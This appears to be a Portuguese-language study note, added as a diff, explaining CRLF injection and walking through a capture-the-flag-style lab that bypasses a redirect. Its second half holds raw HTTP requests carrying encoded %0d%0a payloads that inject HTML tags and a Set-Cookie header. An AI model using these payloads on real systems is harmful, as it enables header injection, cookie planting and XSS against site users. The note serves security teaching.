@@ -1,0 +1,93 @@
+CRLF (injection) O QUE É E COMO ACONTECE ESSA VULNERABILIDADE -> 
+
+· CR (Carriage Return) ->  é voltar para o inicio de uma linha, isso existe desde as máquinas de datilografia e se trata de voltar ao começo de uma linha. Um exemplo disso no terminal linux é utilizarmos o comando \r que irá voltar o texto ao começo da linha, como por exemplo utilizando o seguinte comando: 
+
+	echo -e "teste123\rabc"
+	
+E o resultado desse comando é: abcte123, pois utilizamos \r para voltar ao começo  da linha antes de acabar a escrita, então o abc que seria o resto da frase é escrito no começo e  substitui o texto que até então tinhamos escrito. Esse comando troca as letras pelo número, isso significa que como na nossa frase temos 8 letras e depois do \r temos 4, as 4 primeiras letras serão substituidas.
+
+
+· LF (Line Feed) -> Esse comando pula uma linha, isso é representado no terminal pelo comando \n, por exemplo:
+
+	echo -e "teste123\nteste321"
+	
+O resultado desse comando no terminal é: teste123
+					      teste321
+
+Pois estamos pulando uma linha ao final do primeiro teste. Toda vez que apertamos uma barra de espaço, estamos utiilzando um CRLF
+-----------------------------------
+· O padrão de comunicação do HTTP é utiilzar no final de cada comunicação um CRLF, ou seja, isso significa que por padrão, o protocolo pula uma linha e volta ao inicio em todo o seu cabeçalho. Ao utilizarmos o Burp suite, podemos utilizar a ferramenta para nos mostrar os CRLF (carriage return e line feed), dessa forma um cabeçalho na verdade ficaria da seguinte maneira com essa opção ativada:
+
+GET / HTTP/2 \r \n
+Host: google.com \r \n
+Sec-Ch-Ua: "Chromium";v="93", " Not;A Brand";v="99" \r \n
+Sec-Ch-Ua-Mobile: ?0 \r \n
+Sec-Ch-Ua-Platform: "Linux" \r \n
+Upgrade-Insecure-Requests: 1 \r \n
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 \r \n
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 \r \n
+X-Client-Data: CJWOywE= \r \n
+Sec-Fetch-Site: none \r \n
+Sec-Fetch-Mode: navigate \r \n
+Sec-Fetch-User: ?1 \r \n
+Sec-Fetch-Dest: document \r \n
+Accept-Encoding: gzip, deflate \r \n
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7 \r \n
+\r \n
+
+Assim fica um cabeçalho de requisição HTTP visto com a opção do burp para mostra os CRFLs. Lembrando que \r é para retornarmos ao inicio da linha e \n para pularmos uma linha. O final da requisição do cabeçalho é como se fosse um enter, toda vez que dermos um enter, na verdade estamos utilizando um carriage return e um line feed, isso significa que ao final do cabeçalho, por padrão ele dá um enter, porém isso não é visivel normalmente.
+
+· Até na resposta do HTML dessa requisição nós temos um CRLF:
+
+<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
+<TITLE>301 Moved</TITLE></HEAD><BODY>
+<H1>301 Moved</H1>
+The document has moved
+<A HREF="https://www.google.com/">here</A>.
+</BODY></HTML>
+
+POR QUE ISSO PODE SER UM PROBLEMA? -> Imagina que de alguma forma eu consiga injetar um CRLF na resposta do servidor, então eu digo pro servidor que quero adicionar um novo enter e que agora eu irei controlar o cabeçalho que estará setado ou não, isso falando do lado do servidor, pois assim podemos fazer redirects alterando o header LOCATION para redirecionar o usuario a um site malicioso, ou se pudermos setar um cookie para o navegador da vitima, podemos injetar até mesmo um XSS.
+-----------------------------------------------------------------------------------
+COMO IDENTIFICAR E EXPLORAR ESSA VULNERABILIDADE? -> O primeiro passo de tudo é analisar as solicitações feitas ao servidor, o nosso lab tem um problema que é: ao acessarmos o endereço, ele nos move a página /admin, isso é, o servidor faz um redirecionamento até endereço 10.10.0.31//admin e para completarmos o lab devemos explorar essa vulnerabilidade e redirecionar somente a raiz da aplicação em si.
+
+Para fazermos isso, devemos analisar com o burp os cabeçalhos da aplicação e o que ele envia ao servidor, ao analisarmos podemos tentar injetar o curriance return e o line feed encodados via url, e para fazermos isso, podemos utilizar o seguinte código 
+
+· %0d -> Esse é o código equivalente para CR encodado via URL
+· %0a -> Esse é o código equivalente para LF encodado via URL
+
+Ao injetarmos essas duas payloads nos cabeçalhos da aplicação, e a aplicação aceitar isso com uma CRLF, podemos começar a injetar nosso proprios cabeçalhos, podemos também injetar HTML e consequentemente JS para fazermos XSS:
+
+GET /%0d%0a HTTP/1.1
+Host: 10.10.0.31
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+Assim fica um cabeçalho com CRLF injetado, podemos também trigar um XSS utilizando dois Carriage Return e dois Line Feed, da seguinte maneira
+
+GET /%0d%0a%0d%0a <h1>podemos injetar tags</h1> HTTP/1.1
+Host: 10.10.0.31
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+Como visto no cabeçalho, podemos injetar tags diretamente dentro dos cabeçalhos, então com isso podemos trigar diversos XSS e ataques diferentes. 
+
+Podemos também setar um cookie utilizando CRLF da seguinte maneira:
+
+GET /%0d%0aSet-Cookie:%20teste=test HTTP/1.1
+Host: 10.10.0.31
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+O %20 serve para darmos um espaço, ou seja, é um espaço encodado para URL. Ao pularmos com o CRLF o cabeçalho que redireciona a aplicação, podemos fazer com que o redirecionamento não seja feito e dessa forma conseguimos a nossa flag.
